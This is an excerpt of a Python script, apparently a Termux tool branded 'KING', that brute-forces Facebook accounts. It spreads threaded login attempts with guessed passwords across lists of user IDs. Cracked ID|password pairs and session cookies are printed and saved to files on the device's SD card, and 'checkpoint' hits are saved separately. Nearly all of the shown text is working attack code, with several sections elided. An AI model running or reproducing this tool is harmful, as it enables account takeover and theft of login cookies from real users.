...
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.KING-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.KING-cov', 'w')
	kok.write(myid+imt)
	kok.close()
...
def method1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;35m [\033[1;37mKING\033[1;35m]\033[1;32m %s\033[1;37m|\033[1;32m[OK:-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36',}
                        ...
                        if "c_user" in KING:
                                ...
                                dek(f'\r\r\033[1;35m [\033[1;37mDJ-KING OK\033[1;35m]\x1b[1;92m %s \x1b[1;97m| \x1b[1;92m%s\x1b[1;97m'%(ids,pas))
                                open('/sdcard/KING-file-OK.txt', 'a').write(ids+'|'+pas+'\n');open('/sdcard/KING-file-COKI.txt','a').write(kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in KING:
                                if 'y' in hdcp:
                                        dek(f'\r\r\033[1;35m [\033[1;37mKING-CP\033[1;35m]\x1b[1;91m '+ids+' \033[1;37m| \x1b[1;91m'+pas+'\033[1;97m')
                                        open('/sdcard/KING-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def method2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;35m [\033[1;37mKING-M1\033[1;35m]\033[1;32m %s\033[1;37m|\033[1;32m[OK:-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in KING:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                dek(f'\r\r\033[1;35m [\033[1;37mDJ-KING OK\033[1;35m]\x1b[1;92m %s \x1b[1;97m| \x1b[1;92m%s\x1b[1;97m'%(ids,pas));dek("\033[1;37m [\033[1;36mCOOKIES🍪\033[1;37m] : \33[1;92m"+kuki+"")
                                open('/sdcard/KING-file-OK.txt', 'a').write(ids+'|'+pas+'\n');open('/sdcard/KING-FILE-COKI','a').write(kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in KING:
                                if 'y' in hdcp:
                                        dek(f'\r\r\033[1;35m [\033[1;37mKING-CP\033[1;35m]\x1b[1;90m '+ids+' \033[1;37m| \x1b[1;90m'+pas+'\033[1;97m')
                                        open('/sdcard/KING-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
...
def digit8():
                ...
                try:
                        ...
                        print(40*"=")
                        KINGx = input("  [\x1b[1;96m+\x1b[1;97m] Choose :- ")
                except ValueError:
                        limit = 5000
                ...
                with tred(max_workers=30) as manshera:     
                        ...
                        for psx in user:
                                ...
                                if KINGx in ["1", "01","11","A","a","y","Y","YY","yy"]:
                                    manshera.submit(M1,uid,pwx,tl)
                                elif KINGx in ["2", "02","22","B","b","N","n","NN","nn"]:
...
def digit6():
    ...
    with tred(max_workers=80) as manshera:    
        ...
        for love in user:
            ...
            if KINGx in ["1", "01","12","N","n"]:
                manshera.submit(M1,uid,pwx,tl)
            elif KINGx in ["2", "02","22","Y","y"]:
                 manshera.submit(M2,uid,pwx,tl)
            else:
                 manshera.submit(M3,uid,pwx,tl)
def digit7():
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(' \033[1;35m[\033[1;37mDJ-KING OK\033[1;35m]\033[1;32m '+uid+' \033[1;37m| \033[1;32m'+ps+'\033[0;97m \n''\033[1;37m[\033[1;34mCOOKIES🍪\033[1;37m] : \33[1;96m'+coki+'\n')
                cek_apk(session,coki)
                open('/sdcard/DJ-DJ-KING OK.txt', 'a').write( uid+' | '+cid+' | '+ps+' \n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(' \033[1;35m[\033[1;37mKING-CP\033[1;35m]\033[1;31m '+uid+' \033[1;37m| \033[1;31m'+ps+'\033[0;97m')
                open('/sdcard/DJ-KING-CP.txt', 'a').write( uid+' | '+cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;32m [KING] %s | [OK:-%s]\r\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    except:
        pass
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(' \033[1;35m[\033[1;37mDJ-KING OK\033[1;35m]\033[1;32m '+uid+' \033[1;37m| \033[1;32m'+ps+'\033[0;97m \n''\033[1;37m[\033[1;34mCOOKIES🍪\033[1;37m] : \33[1;96m'+coki+'\n')
                cek_apk(session,coki)
                open('/sdcard/DJ-KINGOK.txt', 'a').write( uid+' | '+cid+' | '+ps+' \n')
                oks.append(cid)
                break
            else:
                continue
